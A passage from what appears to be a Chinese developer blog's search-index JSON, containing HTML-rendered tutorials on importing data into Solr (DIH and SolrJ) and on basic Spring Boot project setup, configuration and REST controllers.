class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">entity</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">document</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"配置requestHandler\"><a href=\"#配置requestHandler\" class=\"headerlink\" title=\"配置requestHandler\"></a>配置requestHandler</h3><p>在<code>solrconfig.xml</code>配置文件中引入<code>db-data-config.xml</code>文件<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">requestHandler</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;/dataimport&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">lst</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;defaults&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">str</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;config&quot;</span>&gt;</span>db-data-config.xml<span class=\"tag\">&lt;/<span class=\"name\">str</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">lst</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">requestHandler</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>保存然后reload core，进入Dataimport模块，选择<code>full-import</code>，点击Excute导入数据。然后进入到Query中查找即可。<br><img src=\"7.PNG\" alt=\"\"></p>\n<p>上述数据导入是走的Data Import Handler，简称<code>DIH</code>。这种方式会遍历数据库，根据创建时间进行增量导入或者全量导入，导入时会检查主键(ID)字段是否存在，选择覆盖或创建一条文档(doc)。这种导入需要在mysql导入完后调用<code>/dataimport</code>接口，异步导入数据。当有数据同步性需求时（如必须对solr中一条数据的创建时间可控），可以选择用<code>/update</code>接口直接导入。</p>\n<h2 id=\"通过-update接口导入\"><a href=\"#通过-update接口导入\" class=\"headerlink\" title=\"通过/update接口导入\"></a>通过/update接口导入</h2><p>Solr的操作都可以通过他提供的HTTP接口完成，所以可以通过<code>/update</code>接口直接同步导入，而Java中提供了对HTTP接口的封装模块<code>SolrJ</code>。创建maven项目，到日pom依赖：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.solr<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>solr-solrj<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>7.2.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>Java中创建一条新的记录：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String SOLR_URL = <span class=\"string\">&quot;http://localhost:8983/solr/phone&quot;</span>;</span><br><span class=\"line\">SolrClient client = <span class=\"keyword\">new</span> HttpSolrClient.Builder(SOLR_URL).withConnectionTimeout(<span class=\"number\">10000</span>).withSocketTimeout(<span class=\"number\">60000</span>).build();</span><br><span class=\"line\"></span><br><span class=\"line\">SolrInputDocument document = <span class=\"keyword\">new</span> SolrInputDocument();</span><br><span class=\"line\">document.setField(<span class=\"string\">&quot;os&quot;</span>,<span class=\"string\">&quot;安卓&quot;</span>);</span><br><span class=\"line\">document.setField(<span class=\"string\">&quot;name&quot;</span>,<span class=\"string\">&quot;小米11&quot;</span>);</span><br><span class=\"line\">document.setField(<span class=\"string\">&quot;description&quot;</span>,<span class=\"string\">&quot;方方面面的新突破，开启了 2021 年高端旗舰的新标准。它轻薄、出彩 - 带来一块创下 13 项纪录的高端屏幕。&quot;</span> +</span><br><span class=\"line\">        <span class=\"string\">&quot;更快的速度、更强大的影像系统，以及全面飞跃的视听体验。&quot;</span> +</span><br><span class=\"line\">        <span class=\"string\">&quot;种种突破，共同成就了这款 2021 年小米高端代表作，助你轻装上阵，一往无前。&quot;</span>);</span><br><span class=\"line\">document.setField(<span class=\"string\">&quot;created_at&quot;</span>,<span class=\"keyword\">new</span> Date());</span><br><span class=\"line\">document.setField(<span class=\"string\">&quot;id&quot;</span>,<span class=\"number\">19</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">client.add(document);</span><br><span class=\"line\">client.commit();</span><br></pre></td></tr></table></figure><br>当要删除时，可以调用<code>/delete</code>接口，也可直接用<code>SolrJ</code>的API。<code>client.deleteByQuery(&quot;*:*&quot;)</code>表示删除全部。无论提交还是删除，都需要调用<code>client.commit()</code>生效:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">client.deleteByQuery(<span class=\"string\">&quot;*:*&quot;</span>);</span><br><span class=\"line\">client.commit();</span><br></pre></td></tr></table></figure></p>\n","tags":["Solr"]},{"title":"SpringBoot基本配置","url":"/2019/05/13/SpringBoot%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/","content":"<blockquote>\n<p>需要IDEA,jdk8以上</p>\n</blockquote>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>SpringBoot需要IDEA Ultimate,新建项目，选择Spring Initializer</p>\n<p><img src=\"Screenshot_20190513_132212.png\" alt=\"\"></p>\n<span id=\"more\"></span>\n<p>Next<br><img src=\"Screenshot_20190513_132329.png\" alt=\"\"></p>\n<p>选择Web<br><img src=\"Screenshot_20190513_132400.png\" alt=\"\"></p>\n<p>Next ,输入项目名，完成，等待依赖自动下载。</p>\n<h2 id=\"配置热更新\"><a href=\"#配置热更新\" class=\"headerlink\" title=\"配置热更新\"></a>配置热更新</h2><ol>\n<li><p>在<code>pom.xml</code>中添加依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- devtools可以实现页面热部署（即页面修改后会立即生效，Screenshot_20190513_132212.png</span><br><span class=\"line\">    这个可以直接在application.properties文件中配置spring.thymeleaf.cache=false来实现） --&gt;</span><br><span class=\"line\">&lt;!-- 实现类文件热部署（类文件修改后不会立即生效），实现对属性文件的热部署。 --&gt;</span><br><span class=\"line\">&lt;!-- 即devtools会监听classpath下的文件变动，并且会立即重启应用（发生在保存时机）</span><br><span class=\"line\">    注意：因为其采用的虚拟机机制，该项重启是很快的 --&gt;</span><br><span class=\"line\">&lt;!-- （1）base classloader （Base类加载器）：加载不改变的Class，例如：第三方提供的jar包。 --&gt;</span><br><span class=\"line\">&lt;!-- （2）restart classloader（Restart类加载器）：加载正在开发的Class。 --&gt;</span><br><span class=\"line\">&lt;!-- 为什么重启很快，因为重启的时候只是加载了在开发的Class，没有重新加载第三方的jar包。 --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;!-- optional=true, 依赖不会传递, 该项目依赖devtools;</span><br><span class=\"line\">        之后依赖boot项目的项目如果想要使用devtools, 需要重新引入 --&gt;</span><br><span class=\"line\">    &lt;optional&gt;true&lt;/optional&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改<code>application.properties</code>文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#&quot;关闭缓存, 即时刷新&quot;</span><br><span class=\"line\">#spring.freemarker.cache=false</span><br><span class=\"line\">#spring.thymeleaf.cache=true  如果开启此处会导致每次输入删除都会自动刷新哪怕你没保存</span><br><span class=\"line\"> </span><br><span class=\"line\">#热部署生效</span><br><span class=\"line\">spring.devtools.restart.enabled=true</span><br><span class=\"line\">#设置重启的目录</span><br><span class=\"line\">spring.devtools.restart.additional-paths=src/main/java</span><br><span class=\"line\"> </span><br><span class=\"line\">spring.devtools.restart.exclude=WEB-INF/**</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>idea的修改<br>File-Settings-Compiler-Build Project automatically，勾选Build Project automatically,确认然后ctrl + shift + alt + / ,选择Registry,勾上 Compiler.autoMake.allow.when.app.running</p>\n</li>\n</ol>\n<p>此时，修改 <code>src/main/java</code>下的代码，Ctrl + S 保存，发现会重新编译。</p>\n<h2 id=\"修改启动端口\"><a href=\"#修改启动端口\" class=\"headerlink\" title=\"修改启动端口\"></a>修改启动端口</h2><p><code>application.properties</code>中加入<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server.port=8080</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"MySQL-Jdbc\"><a href=\"#MySQL-Jdbc\" class=\"headerlink\" title=\"MySQL Jdbc\"></a>MySQL Jdbc</h2><p>pom.xml:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>application.properties<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">spring.datasource.url=jdbc:mysql://localhost:3306/test?useUnicode=true&amp;zeroDateTimeBehavior=convertToNull&amp;autoReconnect=true</span><br><span class=\"line\">spring.datasource.username=</span><br><span class=\"line\">spring.datasource.password=</span><br><span class=\"line\">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br></pre></td></tr></table></figure></p>\n<p>SQL:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database test;</span><br><span class=\"line\">use test;</span><br><span class=\"line\">create table user (name varchar(30),password varchar(50));</span><br><span class=\"line\">insert into user values(&quot;user&quot;,&quot;pwd&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>Java:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DemoController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> JdbcTemplate jdbcTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/sql&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map <span class=\"title\">sqlDemo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        String sql=<span class=\"string\">&quot;insert into user (name,password) values (?,?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> count= jdbcTemplate.update(sql, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;user001&quot;</span>,<span class=\"string\">&quot;password001&quot;</span>&#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Rest-Api例子\"><a href=\"#Rest-Api例子\" class=\"headerlink\" title=\"Rest Api例子\"></a>Rest Api例子</h2><p>创建一个Controller例子，<code>LoginController.java</code><br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoginController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/get&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map <span class=\"title\">demo1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        HashMap res = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        res.put(<span class=\"string\">&quot;msg&quot;</span>,<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"meta\">@PostMapping(&quot;/post&quot;)</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> Map <span class=\"title\">demo2</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> Map req)</span> </span>&#123;</span><br><span class=\"line\">        String data = (String)req.get(<span class=\"string\">&quot;data&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> ok = (<span class=\"keyword\">boolean</span>)req.get(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">        Map res = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        res.put(<span class=\"string\">&quot;data&quot;</span>,data);</span><br><span class=\"line\">        res.put(<span class=\"string\">&quot;ok&quot;</span>,ok);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>测试<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:8080/user/register -H &quot;Content-Type: application/json&quot; -X POST -d &#x27;&#123;&quot;data&quot;:&quot;hello&quot;,&quot;ok&quot;:true&#125;&#x27;</span><br><span class=\"line\">&#123;&quot;data&quot;:&quot;hello&quot;,&quot;get&quot;:true,&quot;ok&quot;:true&#125;</span><br></pre></td></tr></table></figure><br>返回<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;data&quot;:&quot;hello&quot;,&quot;ok&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>\n","tags":["Java"]},{"title":"SpringBoot学习笔记","url":"/2022/01/08/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"起步\"><a href=\"#起步\" class=\"headerlink\" title=\"起步\"></a>起步</h2><h3 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h3><p>在IDEA中选择File-&gt;New-&gt;Project-&gt;Spring Initializr，勾选Web/Spring Web。或者File-&gt;New-&gt;Module，创建一个Maven项目。</p>\n<span id=\"more\"></span>\n<h3 id=\"pom-xml\"><a href=\"#pom-xml\" class=\"headerlink\" title=\"pom.xml\"></a>pom.xml</h3><p>根目录的<code>pom.xml</code>应该是如下内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">relativePath</span>/&gt;</span> <span class=\"comment\">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.xuranus<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>springdemo<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>springdemo<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>springdemo<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">java.version</span>&gt;</span>11<span class=\"tag\">&lt;/<span class=\"name\">java.version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--SpringBoot Web项目起步依赖--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"comment\">&lt;!--SpringBoot 测试起步依赖，默认有，删除需要同时删除test文件夹--&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">            <span class=\"comment\">&lt;!--SpringBoot项目打包依赖--&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>spring-boot-starter-parent</code>定义了项目的父级结构，SpringBoot相关组件无需手动配置，他们的版本号都被<code>spring-boot-starter-parent</code>管理着，可以在IDEA中Ctrl+鼠标查看组件版本号。对于想替换的组件，在<code>dependencies</code>中覆盖。</p>\n<h3 id=\"目录结构\"><a href=\"#目录结构\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h3><p>项目创建完成后，目录结构如下：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">src/main/java/com/xxxx/xxx/</span>             <span class=\"comment\"># SpringBoot项目目录</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">SpringDemoApplication.java</span>            <span class=\"comment\"># SpringBoot启动入口         </span></span><br><span class=\"line\"><span class=\"string\">src/main/resources/</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">static/</span>                              <span class=\"comment\"># 防止网页静态文件，如*.html，*.js，*.css</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">templates/</span>                           <span class=\"comment\"># tymeleaf模板文件                            </span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">application.properties</span>               <span class=\"comment\"># SpringBoot核心配置文件</span></span><br><span class=\"line\"><span class=\"string\">src/test/java/com/xxx/xxx/</span>              <span class=\"comment\"># 测试文件</span></span><br><span class=\"line\"><span class=\"string\">target/</span>                                 <span class=\"comment\"># 编译后的文件</span></span><br><span class=\"line\"><span class=\"string\">pom.xml</span>                                 <span class=\"comment\"># maven项目配置</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Application类\"><a href=\"#Application类\" class=\"headerlink\" title=\"Application类\"></a>Application类</h3><p><code>SpringDemoApplication.java</code>是SpringBoot项目入口，必须有<code>@SpringBootApplication</code>注解，用于开启Spring自动配置。项目代码必须放到Application类<strong>所在目录或下级目录</strong>，才能被Spring容器扫描到并托管。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span> <span class=\"comment\">// Springboot核心注解，用于开启Spring自动配置</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SpringDemoApplication</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        SpringApplication.run(SpringDemoApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Controller\"><a href=\"#Controller\" class=\"headerlink\" title=\"Controller\"></a>Controller</h2><p>Spring中的Controller用于标记HTTP路由，并在其中实现对每次请求的处理。Controller类需要在类上标记<code>@Controller</code>。</p>\n<p>路由以方法定义，并打上响应注解。</p>\n<ul>\n<li><code>@GetMapping</code>：只接受GET请求</li>\n<li><code>@PostMapping</code>：只接受POST请求</li>\n<li><code>@RequestMapping</code>：接受GET和POST请求</li>\n<li><code>@ResponseBody</code>：返回是字符串或者JSON，如果不写会默认返回对应模板</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// IndexController.java</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 返回字符串</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/string&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">stringResponse</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;response a string&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 返回JSON &#123;&quot;key&quot;:&quot;value&quot;&#125;</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/json&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String,String&gt; <span class=\"title\">jsonResponse</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        Map&lt;String,String&gt; response = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        response.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取GET参数 http://localhost:8080/getParams?number=42&amp;word=hello</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/getParams&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, Object&gt; <span class=\"title\">getParams</span><span class=\"params\">(String word, Integer number)</span> </span>&#123;</span><br><span class=\"line\">        Map&lt;String,Object&gt; response = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        response.put(<span class=\"string\">&quot;word&quot;</span>,word);</span><br><span class=\"line\">        response.put(<span class=\"string\">&quot;number&quot;</span>, number);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取POST参数</span></span><br><span class=\"line\">    <span class=\"comment\">// curl http://localhost:8080/postParams -H &quot;Content-Type: application/json&quot; -X POST -d &#x27;&#123;&quot;data&quot;:&quot;hello&quot;,&quot;ok&quot;:true&#125;&#x27;</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/postParams&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, Object&gt; <span class=\"title\">postParams</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> Map&lt;String, Object&gt; request)</span> </span>&#123;</span><br><span class=\"line\">        Map&lt;String,Object&gt; response = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        response.put(<span class=\"string\">&quot;data&quot;</span>, (String)request.get(<span class=\"string\">&quot;data&quot;</span>));</span><br><span class=\"line\">        response.put(<span class=\"string\">&quot;ok&quot;</span>, (Boolean)request.get(<span class=\"string\">&quot;ok&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h2><p><code>application.properties</code>作为SpringBoot唯一的配置文件，可以在其中设置所有配置，无论是Redis，MySQL的连接参数，还是端口号，上下文路径，无需像SpringMVC中在各处做复杂的配置，SpringBoot将它们全集中于此处。</p>\n<p>一般它的形式如下：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span 